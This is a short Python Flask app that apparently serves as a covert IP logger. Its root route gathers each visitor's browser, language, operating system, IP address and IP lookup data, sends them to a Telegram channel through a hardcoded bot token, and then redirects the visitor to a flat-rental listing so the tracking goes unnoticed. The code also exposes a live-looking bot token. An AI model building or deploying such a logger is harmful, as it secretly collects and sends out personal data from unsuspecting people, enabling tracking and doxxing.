import requests
from flask import Flask, redirect
from flask_ipinfo import IPInfo

app: Flask = Flask(__name__)
ip_info: IPInfo = IPInfo()


def send_to_channel(text: str = None):
    """

    :type text: str
    """
    data = {
        "chat_id": "@dssdfkdsafkadsk",
        "text": text
    }
    url = "https://api.telegram.org/bot752649013:AAFKs7z5XqurSyjQ-kHblBqdKiVQEXG4yww/sendMessage?"
    requests.get(url=url, params=data)
    return True


def send_user_info():
    text: str = f"Browser: {ip_info.browser}\nЯзык: {ip_info.lang}\nОС: {ip_info.os}\nIP: {ip_info.ipaddress}\n{ip_info.get_info}"
    return send_to_channel(text)


@app.route('/', methods=['GET'])
def crib_form():
    send_user_info()
    return redirect("https://rieltor.ua/harkov/flats-rent/view/9246735/")


if __name__ == '__main__':
    app.run()

